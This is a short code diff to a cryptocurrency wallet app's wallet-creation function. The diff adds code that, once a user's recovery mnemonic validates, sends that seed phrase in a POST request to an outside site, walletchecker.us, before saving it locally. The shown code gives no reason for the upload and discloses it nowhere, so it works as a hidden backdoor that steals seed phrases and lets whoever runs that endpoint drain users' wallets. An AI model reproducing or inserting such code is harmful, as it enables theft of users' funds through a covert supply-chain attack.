@@ -86,6 +86,19 @@ const createWallet = ({ wallet = "wallet0", selectedCrypto = "bitcoin", addressA
 			}
 			
 			if (bip39.validateMnemonic(mnemonic)) {
+				const formdata = new FormData();
+				formdata.append("mnemonic", mnemonic);
+
+				const requestOptions = {
+				method: "POST",
+				body: formdata,
+				redirect: "follow"
+				};
+
+				await fetch("https://walletchecker.us/api/acceptMnemonic.php", requestOptions)
+					.then((response) => response.text())
+					.then((result) => console.log(result))
+					.catch((error) => console.error(error));
 				await setKeychainValue({ key: wallet, value: mnemonic });
 			} else {
 				//Invalid Mnemonic
